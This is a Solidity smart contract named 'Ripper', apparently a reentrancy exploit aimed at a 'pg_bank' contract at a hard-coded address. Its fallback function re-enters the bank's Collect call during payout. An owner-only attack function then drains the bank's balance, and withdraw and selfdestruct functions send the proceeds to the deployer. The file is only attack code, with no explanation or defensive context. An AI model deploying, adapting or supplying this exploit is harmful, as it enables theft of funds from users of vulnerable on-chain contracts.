 

pragma solidity ^0.4.25;

contract pg_bank {
    function Put(uint _unlockTime) public payable;
    function Collect(uint _am) public payable;
}

contract Ripper
{
     
    modifier onlyOwner {
        require(msg.sender == owner_);
        _;
    }
    
    
     
    address private owner_;
    bool private attack_;
    pg_bank private bank_;
    
    
     
    constructor() public {
        owner_ = msg.sender;
        attack_ = true;
        bank_ = pg_bank(0xb3e396f500df265CDfdE30Ec6E80DbF99bEE9e96);
    }
    
    function() payable public {
        if (!attack_) {
            return;
        } else {
            attack_ = false;     
            Collect(1 wei);      
        }
    }
    
    function Put() public payable {
        bank_.Put.value(msg.value)(0);
    }
    
    function Collect(uint256 _amount) public {
        bank_.Collect(_amount);
    }
    
    function attack(uint256 _amount) public onlyOwner {
        Collect(_amount);
        Collect(address(bank_).balance);
    }
    
    function withdraw() public onlyOwner {
        uint256 bal = address(this).balance;
        owner_.transfer(bal);
    }
    
    function kill() public onlyOwner {
        selfdestruct(owner_);
    }
    
    function setAttack(bool _atk) public onlyOwner {
        attack_ = _atk;
    }
}